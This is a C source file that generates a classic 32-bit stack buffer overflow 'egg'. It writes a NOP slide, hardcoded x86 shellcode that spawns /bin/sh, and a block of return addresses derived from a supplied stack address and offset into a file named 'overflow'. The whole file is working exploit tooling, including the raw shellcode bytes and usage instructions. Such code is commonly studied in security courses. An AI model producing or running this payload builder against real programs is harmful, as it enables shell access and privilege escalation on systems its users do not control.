#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

/************************************************
*   Builds an egg for 32bit buffer overflow     *
*       Parts:                                  *
*        ----------------                       *
*       |    NOP slide   |                      *
*        ----------------                       *
*       |    Shellcode   |                      *
*        ----------------                       *
*       | Address Blocks |                      *
*        ----------------                       *
*                                               *
* REMINDER: Addr. Block must be aligned on a    *
*   long boundary. Shellcode is hardcoded to    *
*   make alignment easier. If shellcode is      *
*   modified, user must also alter SHELLSZ var. *
************************************************/

/* REMINDER: Change this number to the new byte anount if shellcode is changed */
#define SHELLSZ     45
#define NOP         0x90
#define OFFSZ       800

// Current shellcode: Unix - /bin/sh
char mkshell[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
    "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
    "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[]) {
    char *buf, *shell;
    unsigned long **addp;
    unsigned long nopsz, shellsz, addsz, bsize, offset, addr;
    int i,fd;
    
    if(argc != 4 && argc != 5) {
        fprintf(stderr, "Usage: %s <nop slide len.> <address block len.> <SP Address> [offset]\n", argv[0]);
        exit(-1);
    }
    
    offset = (unsigned long)OFFSZ;
    errno = 0;
    nopsz = strtol(argv[1], NULL, 0);
    addsz = strtol(argv[2], NULL, 0);
    addr = strtoul(argv[3], NULL, 0);
    if(argc == 5) {
        offset = (unsigned long)strtol(argv[4], NULL, 0);
    }
    if(errno != 0) {
        fprintf(stderr, "Usage: %s <nop slide len.> <address block len.> <SP Address> [offset]\n", argv[0]);
        fprintf(stderr,"    Error: Non-decimal argument\n");
        exit(-1);
    }
    
    shellsz = SHELLSZ;
    
    printf("    Egg Structure\n");
    printf("        NOP Slide Size                  %lu\n", nopsz);
    printf("        Shellcode Size                  %lu\n", shellsz);
    printf("        Number of Addr. in Addr Block   %lu\n", addsz);
    printf("        Offset                          %lu\n", offset);
    printf("        Stack Address                   %x\n", addr);
    addr = (unsigned long)(addr - offset);
    printf("        Target Address                  %x\n", addr);
    
    addsz *= 4;
    bsize = nopsz+shellsz+addsz;
    
    if(!(buf = malloc(bsize+1))) {
        printf("Malloc failure\n");
        exit(0);
    }
    
    shell = buf + nopsz;
    
    for(i = 0; i < nopsz; i++)
        buf[i] = NOP;
    
    for(i = 0; i < shellsz; i++)
        *(shell++) = mkshell[i];
    
    addp = (unsigned long **)(buf+nopsz+shellsz);
    while((char *)addp < buf+bsize) {
        *(addp++) = (unsigned long *)addr;
    }
    
    buf[bsize] = '\0';
    
    // Name for the buffer exploit below here.
    if((fd = open("overflow",O_WRONLY|O_CREAT|O_TRUNC,0600)) < 0) {
        perror("overflow");
        exit(-1);
    }
    
    write(fd,buf,bsize+1);
    return(0);
}
